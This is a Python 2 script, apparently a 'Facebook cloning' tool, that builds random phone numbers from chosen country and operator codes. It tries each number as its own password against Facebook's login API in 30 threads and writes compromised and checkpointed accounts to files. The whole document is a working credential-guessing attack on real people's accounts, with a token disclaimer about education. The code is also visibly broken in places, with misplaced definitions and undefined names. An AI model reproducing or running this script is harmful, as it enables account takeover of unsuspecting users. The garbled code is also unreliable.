#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To somi
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(1000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 Cloning.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'God by Frends '
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;97m'
R='\033[1;97m'
G='\033[1;97m'
W='\033[1;97m'
S='\033[1;97m'
P='\033[1;97m'
Y='\033[1;97m'
#Dev:somi
##### LOGO #####
logo = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗Updated ✔
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
"""
logo1 = """
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗Updated ✔
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;92m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;92m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;91m     ♦♦♦———————————————————————————————♦♦♦
\033[1;92m░██████╗░█████╗░███╗░░░███╗██╗Updated ✔
\033[1;92m██╔════╝██╔══██╗████╗░████║██║
\033[1;97m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;97m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;92m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;92m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝



\033[1;91m     ♦♦♦———————————————————————————————♦♦♦
\033[1;95m«-----------------\033[1;91m  SOMI \033[1;95m-----------------»"""

jalan("\033[1;97m•◈•───────•◈ NOT A NAME ITS BRAND •◈•───────•◈•") 
jalan("                  \033[1;93m Welcome to SOMI BRAND")  

jalan("\033[1;91m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
jalan("\033[1;98m▇▇\033[1;95m         WellCome to SOMI TOOLS    \033[1;93m▇▇")
jalan("\033[1;91m▇▇\033[1;91m             👇Tool Using Tips👇      \033[1;93m▇▇")
jalan("\033[1;96m▇▇\033[1;93m            Tool Update EveryDay      \033[1;93m▇▇")
jalan("\033[1;95m▇▇\033[1;97m        Termux Data Clear EveryDay    \033[1;93m▇▇")
jalan("\033[1;93m▇▇\033[1;96m      Facebook Id -- Somi musican         \033[1;93m▇▇")
jalan("\033[1;91m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
print "\033[1;95m«-----------------\033[1;91m SOMI\033[1;95m-----------------»"
CorrectUsername = "Somi"
CorrectPassword = "Somi"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;97mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/somi brand')
    else:
        print "\033[1;97mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/somi brand')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo11
        print "\033[1;97m«-----------------\033[1;97mDisclaimer\033[1;97m---------------»"
        time.sleep(0.05)
        print "\033[1;43m       \033[1;34mThis Tool is for Educational Purpose   \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mThis presentation is for educational          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mpurposes ONLY.How you use this information    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mis your responsibility.I will not be          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mheld accountable This Tool/Channel Doesn't    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mSupport illegal activities.for any illegal    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mActivitie This Tool is for Educational Purpose\033[1;0m"
        time.sleep(0.05)
        print "\033[1;97m«-----------------\033[1;97mSOMI\033[1;97m---------------»"
        time.sleep(0.05)
        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;91m Fast Cloning Without fb id \033[1;97m[New Update]"
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;93m Exist"
    pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
        elif peak =="1":
		blackmafiax()
		def blackmafiax():
	os.system('clear')
	print logo
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[1]  Bangladesh\033[1;97m☆.\x1b[1;92m[2]  india'
        time.sleep(0.05)
	print '\033[1;97m-•◈•-\033[1;97m> \033[1;97m☆.\x1b[1;92m[2]  USA '
        action()


def action():
	lovehackerx = raw_input('\n\033[1;97mChoose an Option>>> \033[1;97m')
	if lovehackerx =='':
		print '[!] Fill in correctly'
		action()
	elif lovehackerx =="1":
                print (logo1)
		os.system("clear")
		print (logo1)
		print("\033[1;97m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199")
		try:
			c = raw_input("\033[1;97m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="2":
	            print (logo1)
		os.system("clear")
		print (logo1)
		print("\033[1;97m715,785,765,725,745,735,737, 706, 748, 783, 739, 759, 790")
		try:
			c = raw_input(" \033[1;97mchoose code  : ")
			k="+44"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="3":
                print (logo1)
		os.system("clear")
		print (logo30)
		print("\033[1;97m905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
		try:
			c = raw_input(" \033[1;97mchoose code  : ")
			k="+91"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
			else:
		print '[!] Fill in correctly'
		action()

	xxx = str(len(id))
	jalan ('[✓] Total Numbers: '+xxx)
	time.sleep(0.05)
	jalan(' \033[1;97mPlz Wait Cloned Accounts Will Appear Here')
	time.sleep(0.05)
	jalan ('[!] To Stop Process Press CTRL Then Press z')
	time.sleep(0.05)
	print 44*'-'
	print (logo13)
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[live  ok]\x1b[0m ' + k + c + user + ' -•◈•- ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;97m[Error CP] ' + k + c + user + ' -•◈•- ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
#				else:
#				    pass2="ComingSoon"
#				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
#				    q = json.load(data)
#				    if 'access_token' in q:
#				        print '\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' -•◈•- ' + pass2+'\n'+"\n"
#				        okb = open('save/successfull.txt', 'a')
#				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
#				        okb.close()
#				        oks.append(c+user+pass2)
#				    else:
#				        if 'www.facebook.com' in q['error_msg']:
#					        print '[Checkpoint] ' + k + c + user + ' -•◈•- ' + pass2+'\n'
#					        cps = open('save/checkpoint.txt', 'a')
#					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
#					        cps.close()
#					        cpb.append(c+user+pass2)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 44*'-'
	print '[✓] Process Has Been Completed ....'
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	print """
\033[1;91m     ♦♦♦———————————————————————————————♦♦♦
░\033[1;97m██████╗░█████╗░██████╗░███████╗██████╗░░█████╗░███████╗
\033[1;97m██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗╚════██║
\033[1;97m╚█████╗░███████║██████╔╝█████╗░░██████╔╝███████║░░███╔═╝
\033[1;97m░╚═══██╗██╔══██║██╔══██╗██╔══╝░░██╔══██╗██╔══██║██╔══╝░░
\033[1;97m██████╔╝██║░░██║██║░░██║██║░░░░░██║░░██║██║░░██║███████╗
\033[1;97m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝
\033[1;91m     ♦♦♦———————————————————————————————♦♦♦
 
 Don't Worry Your Error cp ID Will Be Open After 7 Days 

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;97m ....fbtips&tricks...... \033[1;97m :
•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;97m 1sarfraz"""
	
	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
	login()	
          
if __name__ == '__main__':
	login()
#4E9A00
